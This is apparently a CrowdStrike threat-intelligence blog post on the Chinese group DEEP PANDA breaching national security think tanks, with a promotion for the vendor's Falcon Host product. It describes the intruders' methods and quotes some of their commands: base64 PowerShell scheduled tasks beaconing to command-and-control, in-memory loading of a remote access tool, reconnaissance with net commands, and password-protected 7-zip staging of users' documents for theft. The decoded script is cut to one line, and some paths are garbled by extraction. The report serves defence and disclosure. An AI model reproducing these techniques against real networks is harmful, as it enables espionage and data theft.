Deep in Thought: Chinese
Targeting of National Security
Think Tanks

Executive Viewpoint

For some time now, CrowdStrike has been working with a
number of national security think tanks and human rights
organizations on a pro bono basis to help them with their
security posture. These organizations face some of the most
advanced nation-state adversaries — China, Russia, and Iran,
just to name a few. The individuals who are typically targeted at
these institutions tend to be former senior government officials
who still have lots of contacts within Western governments and,
as such, their private correspondence is of extreme interest to
these attackers. The intelligence services of these nation states
are always on the lookout for any clues they may extract from
such private communications that may give them an advanced
insight into what options government policy makers are
considering on particular issues of interest. At the same time,
with access to the victim email mailboxes, the adversaries can

craft very realistic spear-phishing lures to the government
contacts of targeted think tank personnel by piggybacking on
ongoing real conversations and increasing their chances of a
successful compromise of an official government email account.
Despite this high threat level, these think tanks are organized as
non-profits and often do not have the budgets of commercial
organizations to afford cutting-edge security technologies that
can help them effectively detect these threats. For this reason,
CrowdStrike has provided our Falcon Host endpoint security
technology to many of these organizations at no charge to them
to help detect and attribute these attackers on their networks in
real time, as well as to receive instantaneous full forensic
visibility into their behavior to help with full remediation of any
incident.
Recently, Falcon Host has detected multiple simultaneous
compromises at several national security think tanks from an
actor we call DEEP PANDA, one of the most advanced Chinese
nation-state cyber intrusion groups. For almost three years now,
CrowdStrike has monitored DEEP PANDA targeting critical and
strategic business verticals including: government, defense,
financial, legal, and the telecommunications industries. At the
think tanks, Falcon Host detected targeting of senior individuals
involved in geopolitical policy issues, in particular in the
China/Asia Pacific region. However, last week the unprecedented
real-time visibility provided by Falcon Host into this actor’s
escapades allowed analysts to observe a radical change in
targeting.
This actor, who was engaged in targeting and collection of
Southeast Asia policy information, suddenly began targeting
individuals with a tie to Iraq/Middle East issues. This is
undoubtedly related to the recent Islamic State of Iraq and the
Levant (ISIS) takeover of major parts of Iraq and the potential
disruption for major Chinese oil interests in that country. In fact,
Iraq happens to be the fifth-largest source of crude oil imports
for China and the country is the largest foreign investor in Iraq’s
oil sector. Thus, it wouldn’t be surprising if the Chinese
government is highly interested in getting a better sense of the
possibility of deeper U.S. military involvement that could help
protect the Chinese oil infrastructure in Iraq. In fact, the shift in
targeting of Iraq policy individuals occurred on June 18, the day

that ISIS began its attack on the Baiji oil refinery.

The Attacks
CrowdStrike’s Falcon Host technology used by these think tanks
consists of a tiny (under 5mb in size) kernel sensor that is
deployed on Windows and Mac servers, desktops, and laptops
and is able to do real-time detection and recording of all
adversary activities taking place on the system. In addition, by
matching the detected activities against our vast Adversary
Intelligence repository, Falcon Host can automatically attribute
the attack to a known adversary group and provide details about
their motivations, capabilities, and key Tactics, Techniques, and
Procedures (TTPs).
Recently, we detected breaches of these networks via the use of
powershell scripts deployed by the adversary as scheduled tasks
on Windows machines. The scripts are passed to the powershell
interpreter through the command line to avoid placement of
extraneous files on the victim machine that could potentially
trigger AV- or Indicator of Compromise (IOC)-based detection.

The scripts were scheduled to call back every two hours to the
DEEP PANDA Command and Control (C2) infrastructure.

The script in the command line is base64 encoded, but when
decoded it translates to the following code snippet:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback

downloads and runs MadHatter .NET Remote Access Tool (RAT),
one of the favorites of DEEP PANDA. By running them from
memory, it leaves no disk artifacts or host-based IOCs that can
be identified in forensic analysis. This is typical for DEEP PANDA
— stealth is their specialty and they prefer to operate in a way
that leaves a minimal footprint on a victim system and often
allows them to evade detection for a very long time.

For this same reason, DEEP PANDA likes to use webshells to keep
low-footprint persistent access to the victim network, as we’ve
covered in our prior blogs. This case was no exception, and that
initial webshell implant allowed them to execute reconnaissance
commands such as “tasklist,” “net view,” and “net
localgroup administrators,” and then afterward to deploy the
powershell scripts.
The adversary used stolen credentials to mount network shares
via “net use” command. In one case, they brought in Cult of
the Dead Cow’s NetE tool onto the system, but most of the time
they leveraged existing Windows tools and avoided bringing
many new tools into the environment that could make them
noisy and easily detectable by technologies that scan for static
IOCs.
After using compromised credentials to mount file shares, the
adversary was seen compressing data using 7-zip. They were
adding different document types to compressed files by
wildcarding the extensions, such as:
“C:Program Files7­Zip7z” a setup1.log ­r ­pkkk***
“\<share name>users<UserName>*rtf *doc”
“C:Program Files7­Zip7z” a setup1.log ­r ­pkkk***
“\<share name>users<UserName>*ppt”
They knew exactly which users to target based on their research
policy area, and they rapidly pivoted from China/Asia Pacific
policy experts to Iraq/Middle East policy experts once their
tasking collection requirements changed.

Aggressive Use of Ping to Determine Which Machines of Interest
are Online
On one of the compromised machines, the adversary brought in
a command-line version of RAR archiver that was named
“cftmon.exe” and placed it into “c:windowstemphotfix”
directory. The files were encrypted (both file data and headers)
with “uinfw” password and the archive files were named after
the initials of each user that had been targeted and stored in the
same “c:windowstemphotfix” directory.
For lateral movement, they used WMI to deploy the powershell
scripts remotely and setup scheduled tasks on the remote
systems.

Despite the fact that we were seeing nearly identical TTPs used
across multiple think-tank targets, there is evidence to indicate

that these operations had different individuals behind the
keyboard based on the intricacies of how certain powershell
command lines had been used in each case.

Summary
DEEP PANDA presents a very serious threat not just to think
tanks, but also multinational financial institutions, law firms,
defense contractors, and government agencies. Due to their
stellar operational security and reliance on anti-forensic and
anti-IOC detection techniques, detecting and stopping them is
very challenging without the use of next-generation endpoint
technology like Falcon Host. Not only was Falcon Host able to
detect this adversary without relying on static signatures or
IOCs, but it was able to provide instantaneous and full forensic
analysis of what had occurred on each of the compromised
endpoints without the need to pull hard drives and do costly and
time-intensive forensics, substantially reducing the time needed
for remediation.
If you are a non-profit think tank or a human rights organization
that would like to take advantage of our no-charge offer of Falcon
Host licenses for your servers and desktops, please email us at
sales@crowdstrike.com with the subject “Non-Profit Falcon
Host Offer.”
Our Falcon Intelligence subscribers have had access to multiple
reports on the DEEP PANDA actor that includes full analysis of
their attribution, tradecraft and TTPs, as well as detection



indicators and signatures and remediation instructions. And our
CrowdStrike Services has worked on multiple intrusion
investigations related to DEEP PANDA in the last year. If you
would also like to see a demo of Falcon Host or Falcon
Intelligence in action or discuss our Services offerings, please
contact our Sales Team to schedule a personal briefing.
Stay safe and keep a watchful eye on the Pandas, Bears, Kittens,
and other adversaries who are relentlessly preying on your data!
